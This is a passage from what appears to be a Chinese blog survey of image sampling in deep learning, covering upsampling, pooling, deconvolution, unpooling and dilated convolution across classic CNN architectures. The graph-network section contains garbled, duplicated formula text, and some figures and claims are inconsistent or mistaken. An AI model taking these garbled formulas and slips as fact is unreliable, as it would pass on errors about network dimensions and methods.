深度朗伯网络、循环支持向量机等[1-07]。</p><p>对于图像分类、处理任务，神经网络中一大部分操作是采样，尤其是卷积神经网络。而神经网络的采样操作中较为常见的为卷积和池化，另外还有反卷积、反池化等多种多样的采样操作。各种采样的目的与原理都不尽相同，正是这些不一样的采样构成了神经网络结构中重要的部分。</p><h2 id="2-上采样与下采样"><a href="#2-上采样与下采样" class="headerlink" title="2.上采样与下采样"></a>2.上采样与下采样</h2><h3 id="上采样"><a href="#上采样" class="headerlink" title="上采样"></a>上采样</h3><p>在计算机视觉领域，输入图像通过卷积核提取特征后，输出的尺寸可能会变小，虽然在图像分类的是没有需要将图像再次恢复到原来的尺寸，但是图像的语义分割等却是需要恢复图像尺寸以便进行进一步计算。这种扩大图像尺寸，实现图像从小分辨率提升到大分辨率的映射操作，叫做上采样(Upsample)。 目前常见的上采样有插值法、反卷积、反池化，此外深度学习中的上采样方法还有 ： 扩张（空洞）卷积（dilated conv） 、PixelShuffle 、 DUpsampling 、 Meta-Upscale 、 CAPAFE等。</p><p>其中插值的方法，即在原图像已有的像素点之间插入新的像素点。目前已有的插值方法包括：双线内插法、 三次内插法 、反距离加权插值法、克里金插值法、最小曲率法、谢别德法、自然邻点插值法、最近邻点插值法、多元回归法、径向基函数法、线性插值三角网法、移动平均法、局部多项式法、 距离倒数乘方法 、 自然邻点插值法 、 拉格朗日插值法、牛顿均差插值法、分段线性插值、分段三次Hermite插值、三次样条插值[2-01~10]……插值的在超分辨率图像重建等方面有重要的应用。</p><p>反卷积和反池化等则常在卷积神经网络中出现。</p><h3 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h3><p> 下采样（subsampled）也称为降采样downsampled），其采样层是使用池化的相关技术来实现，目的是降低维度并保留有效特征，可在一定程度避免过拟合。</p><p>池化属于降采用的一种，池化除了降低维度，其目的还有保持旋转、平移、伸缩不变形，增大感受野等。采样有最大值采样，平均值采样，求和区域采样和随机区域采样等；池化也类似地有最大值池化，平均值池化，随机池化，求和区域池化等。</p><p>降采样原理：对一个尺寸大小为M * N地图像 ，对其进行 s倍下采样，即得到$\frac{M * N}{s^2}$分辨率地图像，其中$s$是$M$,$N$的公约数。具体对于特征图，则是把原始图像像素点为$s*s$的区域的变成一个像素，这个像素点的值就是该区域内所有像素的均值：$p_k=\sum_{i \in win(k)}I_i/s^2$</p><p>降采样的作用主要有：</p><ol><li><p>保持平移、旋转等的不变性；</p></li><li><p>降维的同时保留主要特征，减少计算量，防止过拟合，提高模型泛化能力。 </p></li></ol><p>卷积神经网络中常见的降采样通过是池化层实现，目前常见的池化层有：最大池化层，平均池化层等。池化目的是对输入的特征图（Feature Map）进行降维以减少参数并且保留有效的特征，以减少之后的运算量。</p> <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/深度学习图像采样综述(1.jpg" srcset="/img/loading.gif" lazyload="" width="600"></center> <h2 id="3-卷积神经网络中的图像采样"><a href="#3-卷积神经网络中的图像采样" class="headerlink" title="3.卷积神经网络中的图像采样"></a>3.卷积神经网络中的图像采样</h2><p>近几年来随着深度学习的迅速发展，卷积神经网络在计算机视觉领域理论与应用快速发展。2012年AlexNet[3-01]在ImageNet 大规模图像分类挑战赛的成绩让众多研究者看到神经网络在计算机视觉上的历史性突破，由此掀起了卷积神经网络的研究热潮，深度学习也从学术界到业界逐渐被大众熟知。之后，新的神经网络不断出现，著名的有牛津大学视觉几何组在2014年提出的VGGNet [3-02]、由谷歌研究人员提出的GoogleNet [3-03] ；2016年由何凯明等人提出的ResNet [3-04] 使神经网络超过上百层且效果更佳，并衍生出了ResNeXt、DenseNet 、NPN、SENet等；在2018年CVPR会议，张婷等人延续IGCV 1提出了IGCV 2 和IGCV 3 [3-05]。如今卷积神经网络在图像分类、语义分割、目标检测、目标追踪、行为识别等领域都有了可观的应用成果[3-06]。</p><p>典型的卷积神经网络一般包括输入层、输出层以及诸多的隐藏层，其中隐藏层一般由卷积层、池化层、全连接层、等构成，其中卷积以及池化其本质是图像采用。卷积神经网络最具有特色的结构便是卷积核，由于卷积才使得卷积神经网络在处理图像上相对于循环神经网络等效果较好。卷积和池化是提取特征和降维的过程，特征图经过数层的卷积运算最终得到的是较为高级的特征，因而，如何利用有限的计算资源提取出更多有效的高级特征便是深度学习在计算机视觉领域研究内至关重要的研究。</p><p>卷积神经网络中的图像采样主要表现在卷积以及池化，卷积主要目的在于提取特征，而池化的目的在于降维减少计算量。输入层读入规则化的图像，每一层的每个神经元将前一层的一组小的局部感受野并权值共享。神经元抽取边缘、角点等基本的视觉特征，经过一层层的采样逐渐转变为高级视觉特征。卷积神经网络通过卷积操作获得特征图，每个位置，来自不同特征图的单元得到各自不同类型的特征。一个卷积层中可能包含多个不同权值的特征图，这使得被保留的图像具备更丰富的特征。卷积层后边会连接池化层进行降采样操作，一方面可以降低图像的分辨率，减少参数量，另一方面可以获得平移和形变的鲁棒性。卷积层和池化层的交替分布，使得特征图的数目逐步增多，而且分辨率逐渐降低，最终完成分类。</p><h3 id="3-1-卷积自编码器"><a href="#3-1-卷积自编码器" class="headerlink" title="3.1 卷积自编码器"></a>3.1 卷积自编码器</h3><p>无监督学习方法的主要目的是从未标记的数据中提取一般有用的特征，检测和去除输入冗余，并在稳健和有区别的表示中仅保留数据的基本方面。卷积自编码器是一种结合了卷积和池化操作的无监督学习方法，其通过特征提取、堆栈，实现深层的神经网络[3.1-1]。 </p><center><img src="http://deeplearning.stanford.edu/wiki/images/f/f9/Autoencoder636.png" srcset="/img/loading.gif" lazyload="" width="300"></center><center>图 卷积自编码器</center><p>假设有k个卷积核，每个卷积核由参数$w^k$和$b^k$组成，用和$h^k$表示卷积层，则<br>$$<br>h^k=σ(x∗w^k+b^k)<br>$$<br>将得到的$h^k$进行特征重构，可以得到下式：<br>$$<br>y=σ(h^k∗w^k+c)<br>$$</p><p>将输入的样本和最终利用特征重构得出来的结果进行欧几里得距离比较，通过BP算法进行优化，就可以得到一个完整的卷积自编码器（CAE）:<br>$$<br>E=\frac{1}{2n}∑(x_i−y_i)^2<br>$$</p><h3 id="3-2-经典卷积神经网络"><a href="#3-2-经典卷积神经网络" class="headerlink" title="3.2 经典卷积神经网络"></a>3.2 经典卷积神经网络</h3><h4 id="3-2-1-LeNet"><a href="#3-2-1-LeNet" class="headerlink" title="3.2.1 LeNet"></a>3.2.1 LeNet</h4><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200408004128834.png" srcset="/img/loading.gif" lazyload="" alt="image-20200408004128834"></p><p>从最早的卷积神经网络LetNet-5的结构图中可看出其具有两个卷积层和两个池化层（图中表示为降采样层），输入32 * 32 *3的图像，第一个卷积层将三个通道的RGB图按照卷积计算的规则提取低级特征得到6个28 * 28的特征图，第一个池化层对3 * 32 *32 的图像经过卷积运算后得到的的特征图进行采样，得到 6个14 * 14 的特征图。 这是神经网络中最早利用图像局部相关性的原理而对图像抽样，以达到减少数据处理量并保留有用信息。第二个池化层通过降采样将16个10 * 10的特征图转变为16个5 * 5的特征图。不难看出，LetNet-5的计算量都是经过降采样减少的，而图像特征则是经过卷积提取的。</p><h5 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h5><p>卷积操作通过卷积核（Convolution Kernel ）实现，卷积核并非在深度学习中最早提出，早在边缘检测等研究例如Sobel 算子等滤波算子就已出现，当时被称为Filter[3.2.1-1]。卷积核具有的一局部性，即它只关注局部特征，局部的程度取决于卷积核的大小，其意义在于比较图像邻近像素的相似性，而图像相邻像素通常有一定的关联，故卷积这种采样方式很适合用于深度学习中对图像的处理。</p><p>时域卷积对应频域相乘，故原图像与卷积核的卷积，其实是对频域信息的选择。例如，图像中的边缘和轮廓属于是高频信息，图像中某区域强度的综合考量属于低频信息。</p><p>信号与图像处理中的一维信号的卷积：<br>$$<br>y[n]=x[n]*h[n]= \sum_k x[k]h[n-k]<br>$$<br>其中 $x[n]$是输入信号 $h[n]$是单位响应。于是输出信号 $y[n]$就是输入信号 $x[n]$的延迟响应的叠加。这也就是一维卷积本质：加权叠加/积分。</p><p>那么对于二维信号，比如图像，卷积的公式为：<br>$$<br>y[m,n]=x[m,n]<em>h[m,n]=\sum_j \sum_i x[i,j]h[m-i,n-j]<br>$$<br>若卷积核大小是3</em>3，则卷积核如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122143230026.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p> 输入图像到输出图像的变化如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122143341925.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>二维卷积也有加权叠加/积分的作用,其中卷积核进行了水平和竖直方向的翻转。</p><p>kernel size（卷积核大小） =3 ,stride（步长）=1 的反卷积计算过程：<br>$$<br>\vec{w}=[w_1 \quad w_2 \quad w_3]^T \quad<br>\vec{x}=[x_1 \quad x_2 \quad x_3 \quad x_4]^T \<br>\vec{w}*^T \vec{x}=<br>\left[<br> \begin{matrix}</p><p> w_1 \quad w_2 \quad w_3 \quad 0 \quad 0 \quad 0\<br> 0 \quad w_1 \quad w_2 \quad w_3 \quad 0 \quad 0 \<br> 0 \quad 0 \quad w_1 \quad w_2 \quad w_3 \quad 0  \<br> 0 \quad 0 \quad 0 \quad w_1 \quad w_2 \quad w_3  \</p><p> \end{matrix}<br>  \right]</p><p>  \left[<br> \begin{matrix}<br> 0\<br> x_1 \x_2 \x_3 \x_4 \<br> 0<br>   \end{matrix}<br>  \right]</p><p>  =</p><p>  \left[<br> \begin{matrix}</p><p> w_2 x_1+w_3x_2 \<br>  w_1x_1+w_2x_2+w_3x_3 \<br> w_1x_2+w_2x_3+ w_3x_4  \<br> w_1x_3+w_2x_4 \</p><p> \end{matrix}<br>  \right]<br>$$</p><h5 id="池化"><a href="#池化" class="headerlink" title="池化"></a>池化</h5><p>池化层又成为降采样层或（下）欠采样层，其与卷积都是卷积神经网络中不可缺少的一部分，较早的卷积神经网络例如AlexNet通常会是卷积层后会紧跟一个池化层。池化的主要功能是对特征进行降维，减少参数量以降低计算量，避免过拟合，最大池化和平均池化是最为常见的两种池化方式。最大池化保留了图像纹理特征,平均池化保留了图像的整体数据特征，池化都达到了降维的作用。</p><p>以最大池化为例，其过程如图所示：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/fsafsa13213.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>和卷积层类似，池化层也有<strong>窗口</strong>和<strong>步长</strong>的概念，其中<strong>步长</strong>在里面的作用也是完全相同的，就是窗口每次移动的像素个数。</p><h4 id="3-2-2-AlexNet"><a href="#3-2-2-AlexNet" class="headerlink" title="3.2.2 AlexNet"></a>3.2.2 AlexNet</h4><p> <img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122143517475.png" srcset="/img/loading.gif" lazyload="" alt=""> </p><p>AlexNet是2012年 ImageNet大规模视觉识别挑战赛（ ILSVRC ）的冠军，正是它的出现让沉寂14年的卷积神经网络受到瞩目，因而促使了深度学习快速的快速发展。</p><p>因为显存的关系，AlexNet在两个GPU上训练，输入的是227 * 227 * 3的RGB图像。对于单个GPU，图像是经过卷积运算之后为55 * 55 *3，该神经网络总过对特征图经过三次最大池化（降采样）分别得到27 * 27 *96 ，13 * 13 * 256，6 * 6 * 256 。<br>相较于LeNet，AlexNet采用了分组卷积，其分布式计算使得图像特征得以分散在不同的计算设备上计算；另外其卷积步长不再完全为1，这种步长大于1的卷积被称之为跨步卷积。</p><h5 id="分组卷积（-Group-convolution-）"><a href="#分组卷积（-Group-convolution-）" class="headerlink" title="分组卷积（ Group convolution ）"></a>分组卷积（ Group convolution ）</h5><p>由于计算资源有限，AlexNet使用两个GPU训练模型，故卷积操作在两个GPU处理，特征图也在两个GPU上处理，最后把两个GPU的计算结果融合。</p><p>此后许多轻量级的SOTA网络（State Of The Art， 指在该项研究中当前最先进的网络结构）都用到了分组卷积，以完成多个计算设备使用有限的算力。</p><h5 id="跨步卷积（Strided-Convolution）"><a href="#跨步卷积（Strided-Convolution）" class="headerlink" title="跨步卷积（Strided Convolution）"></a>跨步卷积（Strided Convolution）</h5><p>相比LeNet-5，AlexNet的卷积操作开始出现充填(padding)和步长(stride)，此后的卷积神经网络中跨步卷积成了常见的卷积操作。</p><p>kernel size（卷积核大小） =3 ,stride（步长）&gt;1 的反卷积计算过程：<br>$$<br>\vec{w}=[w_1 \quad w_2 \quad w_3]^T \quad\vec{x}=[x_1 \quad x_2 \quad x_3 \quad x_4]^T \\vec{w}*^T \vec{x}=\left[ \begin{matrix}  w_1 \quad w_2 \quad w_3 \quad 0 \quad 0 \quad 0\ \0 \quad w_1 \quad w_2 \quad w_3 \quad 0 \quad   \end{matrix}  \right]    \left[ \begin{matrix}0\ x_1 \x_2 \x_3 \x_4 \0   \end{matrix}  \right]    =    \left[ \begin{matrix}  w_2 x_1+w_3x_2 \  w_1x_2+w_2x_3+w_3x_4 \      \end{matrix}  \right]<br>$$</p><p>当卷积stride（步长）&gt;1时可起到降采样的作用。</p><h4 id="3-2-3-ZFNet"><a href="#3-2-3-ZFNet" class="headerlink" title="3.2.3 ZFNet"></a>3.2.3 ZFNet</h4><h5 id="反卷积"><a href="#反卷积" class="headerlink" title="反卷积"></a>反卷积</h5><p>反卷积（Deconvolution） 的概念首次出现在Zeiler在2010年发表的论文中[3.2.3-1]，而Zeiler在2011年发表的论文中反卷积作为术语正式使用[3.2.3-2]。ZFNet沿袭AlexNet的网络架构，并提出了有关优化性能的一些关键想法 ， 展示了将滤波器和权重可视化的正确方法 ， 反卷积可视化训练过程中特征的演化及发现潜在的问题[3.2.3-3]。随后反卷积在神经网络可视化上的成功应用的案例逐渐增多，例如场景分割、生成模型等的工作也逐渐采用反卷积。反卷积也有很多其他的叫法，比如：Transposed Convolution，Fractional Strided Convolution等。</p><p> 反卷积是上采样的一种，由于其是通过转置卷积核来达到去除卷积的目的，因而也称为转置卷积(transpose convolution)或者分数步长卷积(convolution with fractional strides)或者后向卷积(backwards strided convolution)，其名称具有一定的争议性。 反卷积并非正向卷积的完全逆向，从目前的实现方法上看我们可以将其视作一种较特殊的正向卷积。反卷积按照一定的比例在图像边缘补0来扩大图像的尺寸，再旋转卷积核，最后进行正向卷积。</p><p>反卷积的数学表达：</p><ul><li>输入大小$ i \times i$的图像，卷积核大小为$ k \times k $，由图像边缘充填(padding) $p$ , 步长(strides) $s$ ，由卷积计算公式$o = \frac{i+2p-k}{s}+1$得到输出图像大小为$o \times o$</li><li>输入$ i \times i$的图像特征转变为列向量$X$，输出$ o \times o$的图像特征展开成列向量$Y$ .</li><li>若是正向卷积，则由$Y=CX$得到稀疏矩阵$C$；若是反向卷积，则由$Y=C^T X$ 得到$ C $</li></ul><p>当卷积 stride &gt;1(步长大于1)时，可以实现降采样；类似的，反卷积也可以实现升采样。</p><p>kernel size（卷积核大小） =3 ,stride（步长）=1的反卷积计算过程：<br>$$<br>\vec{w}=[w_1 \quad w_2 \quad w_3]^T \quad<br>\vec{x}=[x_1 \quad x_2 \quad x_3 \quad x_4]^T \<br>\vec{w}*^T \vec{x}=<br>\left[<br> \begin{matrix}</p><p> w_1 \quad 0\quad 0\quad 0 \<br> w_2 \quad w_1\quad 0\quad 0 \<br> w_3 \quad w_2 \quad w_1 \quad 0  \<br> 0 \quad  w_3 \quad w_2 \quad w_1  \<br> 0 \quad  0 \quad w_3 \quad w_2 \<br> 0 \quad  0 \quad 0 \quad w_3 \</p><p> \end{matrix}<br>  \right]</p><p>  \left[<br> \begin{matrix}<br> x_1 \x_2 \x_3 \x_4<br>   \end{matrix}<br>  \right]</p><p>  =</p><p>  \left[<br> \begin{matrix}</p><p> w_1 x_1 \<br>  w_3x_1+w_1x_2 \<br> w_3x_2+w_2x_3+ w_1x_3  \<br> w_3x_2+w_2x_3+ w_1x_4  \<br> w_3x_3+w_2x_4  \<br> w_3x_4 \</p><p> \end{matrix}<br>  \right]<br>$$<br>kernel size（卷积核大小） =3 ,stride（步长）&gt;1 的反卷积计算过程：<br>$$<br>\vec{w}=[w_1 \quad w_2 \quad w_3]^T \quad<br>\vec{x}=[x_1 \quad x_2 \quad x_3]^T \<br>\vec{w}*^T \vec{x}=<br>\left[<br> \begin{matrix}</p><p> w_1 \quad 0 \<br> w_2 \quad 0 \<br> w_3 \quad w_1  \<br> 0 \quad  w_2  \<br> 0 \quad  w_3  \<br> 0 \quad  0 \</p><p> \end{matrix}<br>  \right]</p><p>  \left[<br> \begin{matrix}<br> x_1 \x_2<br>   \end{matrix}<br>  \right]</p><p>  =</p><p>  \left[<br> \begin{matrix}</p><p> w_1 x_1 \<br> w_2 x_1 \<br> w_3x_1+w_1x_2  \<br> w_2x_2  \<br> w_3x_2  \<br> 0  \</p><p> \end{matrix}<br>  \right]<br>$$</p><h5 id="反池化"><a href="#反池化" class="headerlink" title="反池化"></a>反池化</h5><p>反池化是上采样的一种，ZFNet作者在论文中首次使用反池化。反池化是池化的逆操作，因为经过池化之后部分信息已丢失，因而想要以池化后的信息恢复到全部信息，则存只能通过补位来实现最大程度上的信息完整。</p><p>池化有两种：最大池化和平均池化，其反池化也需要与其对应。反池化无法直接实现，ZFNet作者在训练神经网络的过程中记录每个池化操作z*z的区域内输入最大值的位置，反池化时，将最大值返回其对应的位置，其余位置的数值补为0，由此近似得实现了反池化。 </p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122143601820.png" srcset="/img/loading.gif" lazyload="" alt=""> </p><p> <img src="https://img-blog.csdnimg.cn/20200220230126232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2d3cGppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"> </p><h4 id="3-2-4-VGGNet"><a href="#3-2-4-VGGNet" class="headerlink" title="3.2.4 VGGNet"></a>3.2.4 VGGNet</h4><p>VGGNet为此前卷积神经网络的加深网络，VGGNet的层数更深，大量的卷积层更利于图像从低级特征提取到高级特征。VGGNet-19 训练输出的图像大小为 224 * 224 *3，经过第一次卷积之后的图像特征大小为 224 *224 * 64。VGGNet-19 一共有五个池化层，池化后的特征图大小分别是 112 * 112 * 65，56 * 56 * 128，28 * 28 *256，14 * 14 * 512，7 * 7 * 512.</p><p>VGGNet中每个最大池化层后的滤波器数量都增加一倍，因而加强了缩小空间尺寸并保持深度增长。在此前，如AlexNet的卷积大小为11*11，而在VGGNet中，卷积核大小都较小，至此已充分证明卷积核两个3 * 3jchang的卷积采样效果会比一个5 * 5的卷积核好，且计算量也相对较小，故此后的神经网络中除了一些特定的应用场景所需否则都一般采用较小的卷积核。</p><h4 id="3-2-5-GoogLeNet"><a href="#3-2-5-GoogLeNet" class="headerlink" title="3.2.5 GoogLeNet"></a>3.2.5 GoogLeNet</h4><h4 id="V1"><a href="#V1" class="headerlink" title="V1"></a>V1</h4><p>GoogLeNet是 ImageNet 2014比赛分类的冠军，其错误率低至6.656%，相比此前的卷积神经网络，其大大增加了卷积神经网络的深度。 GoogLeNet Incepetion V1相比AlexNet的卷积神经网络更深，但是计算量却更少，准确率确远高于AlexNet。GoogLeNet参数少是相比其他神经网络计算量更小的直接原因，造成参数少的原因除了模型精心设计因而参数复用率高以外，另外用全局平均池化层代替了以往的网络结构中最后的全连接。</p><h4 id="V2"><a href="#V2" class="headerlink" title="V2"></a>V2</h4><h4 id="V3"><a href="#V3" class="headerlink" title="V3"></a>V3</h4><h4 id="3-2-6-ResNet"><a href="#3-2-6-ResNet" class="headerlink" title="3.2.6 ResNet"></a>3.2.6 ResNet</h4><p>ResNet（残差网络）在网络架构上参照了Inception V1，其快捷连接(shortcut connection)降低了池化层的重要性，以ResNet-34为例，从网络结构中可以清楚地看到只有第一次卷积以及倒数第二层池化层，此外便全是卷积层。通过恒等映射的方式解决神经网络准确率饱和退化的问题，因而这种网络结构可以达到远超过此前的深层次，并且除了输入输出的邻近层外都可以采用卷积核逐步提取图像特征，由此可以在保证增加层数并使用卷积将图像从低级特征逐步提取到高级特征，在不考虑降维的情况下无需在中间加入池化层。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/shendu153135.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>ResNet中当输入输出尺寸发生增加时，会考虑两个策略：（a）快捷连接仍然使用自身映射，对于维度的增加用零来填补空缺。此策略不会引入额外的参数；（b）投影捷径被用来匹配尺寸（由1×1的卷积完成）。对于这两种选项，当快捷连接在两个不同大小的特征图谱上出现时，用步长(stride)等于2来处理。在工程实现中常常采用了第二种解决方式，并且对于下采样操作(subsample)是通过1x1的池化来完成的。</p><p>ResNet最为重要的是恒等映射的思想，其后大量著名的神经网络借鉴或以其为模板，衍生出了：用不同长度子路径组合选择合适的子路径集合提高模型表达能力的FractalNet[3.6.2-1]； 以ResNetv2为基础增大残差块中的卷积核数量以此学习到更多有用信息的WideResNet[3.6.2-2]；每个分支都用相同的拓扑结构，通过变量基数达到控制组的数量目的的ResNeXt[3.6.2-3]；每一层和前面所有层相连并构建结构窄的网络，学习少量特征图以降低了冗余性的 DenseNet[3.6.2-4] ； 使用残差连接复用特征并大量抛弃最大池化避免高频高幅的DarkNet-53[3.6.2-5] ； 采用空洞卷积而非降采样的方法扩大感受野的 Dilated ResNet[3.6.2-6] 。</p><h4 id="3-2-7-Dilated-ResNet（空洞卷积神经网络）"><a href="#3-2-7-Dilated-ResNet（空洞卷积神经网络）" class="headerlink" title="3.2.7 Dilated ResNet（空洞卷积神经网络）"></a>3.2.7 Dilated ResNet（空洞卷积神经网络）</h4><p>空洞卷积（Dilated Convolution）也被称为扩展卷积或者膨胀卷积，是在2016年由 普林斯顿大学的 Fisher Yu 等人在其参考残差网络构建的空洞卷积神经网络中的一种上采样方法[3.2.7-1] 。扩张卷积是在标准卷积核中注入空洞，以此增加模型的感受野（reception field）。相比常规的卷积操作，扩张卷积增多了一个卷积核的点的间隔数量dilation rate这个参数，常规的卷积操作dilatation rate为1。<br>感受野的大小在目标检测和图像分割尤其重要，而感受野需要依靠下采样，然而图像经过下采样会导致小目标不容易被检测到；虽然多层特征图提取目标在此方面有一定程度的应对效果，，但是前面的特征图语义信息不够因而并不合适 ；<br>如果没有下采样，神经网络的计算量会增大，另外会因为没有逐渐将低级特征提取到高级特征导致效果不佳，感受野也不会有变化。而空洞卷积可以不牺牲特征图尺寸增大感受野[3-02]。空洞卷积的目的是扩大感受野，实际上并没有扩大特征图，因而并不能当作上采样方法。 </p><h4 id="3-2-8-YOLO2"><a href="#3-2-8-YOLO2" class="headerlink" title="3.2.8 YOLO2"></a>3.2.8 YOLO2</h4><p>yolo2是继2015年Joseph Redmon等人提出yolo [3.28-1 ] 之后在2017提出的一种改进 [3-04] 。yolo在工业界应用广泛，大量目标检测的落地都依赖yolo实现。其中在yolo2中提到穿透层(passthrough layer)。</p><p>穿透层的本质是特征重排，26 * 26 * 512的特征图按行和列隔点采样，得到4个13 * 13 * 512的特征图并按通道顺序串联，得到13 * 13 * 2048的特征图.还有就是，穿透层不学习参数，其直接将前面的层的特征重排拼接到后面的层，故网络越在前面的层，感受野越小，因而有利于小目标的检测。</p><h4 id="SENet"><a href="#SENet" class="headerlink" title="SENet"></a>SENet</h4><p>SENet考虑特征通道之间的关系，其显式地建模特征通道之间的相互依赖关系。其采用了一种全新的特征重标定策略。 SENet通过学习的方式获取到每个特征通道的重要程度，再依照此重要程度提升有用的特征并且抑制对当前任务用处不大的特征，以此达到更高效并准确的完成图像分类。 </p><h3 id="3-3-全卷积神经网络"><a href="#3-3-全卷积神经网络" class="headerlink" title="3.3 全卷积神经网络"></a>3.3 全卷积神经网络</h3><p>全卷积神经网络是在2015年由UC Berkeley的Jonathan Long等提出的用于图像语义分割的一种卷积神经网络[3.3-1]。</p><p>普通的卷积神经网络结构适用于图像级别的分类和回归任务，因为其最后得到输入图像的分类的概率。特征图（feature map）在经过最后的卷积操作之后会经过若干个全连接层计算，被映射成为固定长度的特征向量以此完成分类。如AlexNet为完成ImageNet大规模图像分类挑战赛中一千种图像分类故而最后输出一个1000维的向量表示输入图像属于每一类的概率。<br>全卷积神经网络（FCN）对图像进行像素级的分类，其适用于语义级别的图像分割问题。相比经典的CNN在最后使用全连接层得到固定长度的特征向量进行分类不同，FCN可接受任意尺寸的输入图像，采用反卷积对最后一个卷基层的特征图（feature map）进行上采样，使它恢复到输入图像相同的尺寸，从而可以对每一个像素都产生一个预测，同时保留了原始输入图像中的空间信息，最后奇偶在上采样的特征图进行像素的分类。FCN从抽象的特征中恢复出每个像素所属的类别，即从图像级别的分类进一步延伸到像素级别的分类。<br>FCN将传统CNN中的全连接层转化成一个个的卷积层。在传统的CNN结构中，前5层是卷积层，第6层和第7层分别是一个长度为4096的一维向量，第8层是长度为1000的一维向量，分别对应1000个类别的概率。FCN将这3层表示为卷积层，卷积核的大小(通道数，宽，高)分别为（4096,7,7）、（4096,1,1）、（1000,1,1）。所有的层都是卷积层，故称为全卷积神经网络，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20190728153423546.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>其网络结构如下：</p><p>  <img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122143755317.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="3-4-图卷积神经网络"><a href="#3-4-图卷积神经网络" class="headerlink" title="3.4 图卷积神经网络"></a>3.4 图卷积神经网络</h3><p>图(Graph)是一种由若干个结点(Node)及连接两个结点的边(Edge)所构成的图形，用于刻画不同结点之间的关系。下面是一个生动的例子，图片来自论文[14]:</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122144623327.png" srcset="/img/loading.gif" lazyload="" alt="图像与图（示例）"></p><p>最早的图神经网络起源于Franco博士的论文[2], 它的理论基础是<strong>不动点</strong>理论。给定一张图 GG，每个结点都有其自己的特征(feature), 本文中用xvxv表示结点v的特征；连接两个结点的边也有自己的特征，本文中用x(v,u)x(v,u)表示结点v与结点u之间边的特征；GNN的学习目标是获得每个结点的图感知的隐藏状态 hvhv(state embedding)，这就意味着：对于每个节点，它的隐藏状态包含了来自邻居节点的信息。那么，如何让每个结点都感知到图上其他的结点呢？GNN通过<strong>迭代式更新</strong>所有结点的隐藏状态来实现，在t+1t+1时刻，结点vv的隐藏状态按照如下方式更新：</p><p>ht+1v=f(xv,xco[v],htne[v],xne[v]),𝐡𝑣t+1=𝑓(𝐱𝑣,𝐱𝑐𝑜[𝑣],𝐡𝑛t𝑒[𝑣],𝐱𝑛𝑒[𝑣]),</p><p>上面这个公式中的 ff 就是隐藏状态的<strong>状态更新</strong>函数，在论文中也被称为<strong>局部转移函数</strong>(local transaction function)。公式中的xco[v]𝐱𝑐𝑜[𝑣]指的是与结点vv相邻的边的特征，xne[v]𝐱𝑛𝑒[𝑣]指的是结点vv的邻居结点的特征，htne[v]𝐡𝑛t𝑒[𝑣]则指邻居结点在tt时刻的隐藏状态。注意 ff 是对所有结点都成立的，是一个全局共享的函数。那么怎么把它跟深度学习结合在一起呢？聪明的读者应该想到了，那就是利用神经网络(Neural Network)来拟合这个复杂函数 ff。值得一提的是，虽然看起来 ff 的输入是不定长参数，但在 ff 内部我们可以先将不定长的参数通过一定操作变成一个固定的参数，比如说用所有隐藏状态的加和来代表所有隐藏状态。我们举个例子来说明一下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/imsafma134.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></p><p>假设结点55为中心结点，其隐藏状态的更新函数如图所示。这个更新公式表达的思想自然又贴切：不断地利用当前时刻邻居结点的隐藏状态作为部分输入来生成下一时刻中心结点的隐藏状态，直到每个结点的隐藏状态变化幅度很小，整个图的信息流动趋于平稳。至此，每个结点都“知晓”了其邻居的信息。状态更新公式仅描述了如何获取每个结点的隐藏状态，除它以外，我们还需要另外一个函数 gg 来描述如何适应下游任务。举个例子，给定一个社交网络，一个可能的下游任务是判断各个结点是否为水军账号。</p><p>ov=g(hv,xv)𝐨𝑣=𝑔(𝐡𝑣,𝐱𝑣)</p><p>在原论文中，gg 又被称为<strong>局部输出函数</strong>(local output function)，与 f类似，g 也可以由一个神经网络来表达，它也是一个全局共享的函数。那么，整个流程可以用下面这张图表达：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/sadasd315164.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>仔细观察两个时刻之间的连线，它与图的连线密切相关。比如说在 T1T1 时刻，结点 1 的状态接受来自结点 3 的上一时刻的隐藏状态，因为结点 1 与结点 3相邻。直到 TnTn 时刻，各个结点隐藏状态收敛，每个结点后面接一个 gg 即可得到该结点的输出 oo。</p><p>对于不同的图来说，收敛的时刻可能不同，因为收敛是通过两个时刻pp-范数的差值是否小于某个阈值 ϵϵ来判定的，比如：</p><p>$$<br>||Ht+1||2−||Ht||2&lt;ϵ<br>$$</p><h3 id="3-5-时序卷积神经网络"><a href="#3-5-时序卷积神经网络" class="headerlink" title="3.5 时序卷积神经网络"></a>3.5 时序卷积神经网络</h3><h4 id="TCN"><a href="#TCN" class="headerlink" title="TCN"></a>TCN</h4><p>卷积核大小的限制使得卷积不能很好的抓取长时的依赖信息，因而对于时序问题的建模较多采用由于循环自回归而对时间序列的表示较好的循环神经网络（RNN）。 